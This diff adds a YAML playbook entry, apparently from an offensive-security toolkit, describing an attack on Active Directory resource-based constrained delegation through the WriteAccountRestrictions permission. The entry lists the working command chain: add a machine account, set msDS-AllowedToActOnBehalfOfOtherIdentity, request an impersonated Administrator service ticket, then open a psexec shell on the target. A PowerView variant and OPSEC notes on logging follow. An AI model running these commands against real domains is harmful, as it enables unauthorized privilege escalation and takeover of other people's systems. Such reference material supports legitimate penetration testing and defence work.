@@ -1,0 +1,25 @@
+name: WriteAccountRestrictions
+description: Write access to msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD prerequisite)
+commands:
+- '# WriteAccountRestrictions allows configuring RBCD on target computer'
+- ''
+- '# Step 1: Create or use existing computer account (if MAQ > 0)'
+- addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123' '<DOMAIN>/<USER>:<PASSWORD>'
+- ''
+- '# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target'
+- rbcd.py -delegate-to '<TARGET_COMPUTER$>' -delegate-from 'YOURPC$' -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+- ''
+- '# Step 3: Get service ticket via S4U'
+- getST.py -spn 'cifs/<TARGET_COMPUTER>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/YOURPC$:Password123'
+- ''
+- '# Step 4: Use ticket for access'
+- export KRB5CCNAME=Administrator.ccache
+- psexec.py -k -no-pass <TARGET_COMPUTER>
+- ''
+- '# Alternative: Using PowerView'
+- Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+opsec:
+- Computer account creation logged (if MAQ > 0)
+- RBCD configuration changes logged in security events
+references:
+- https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
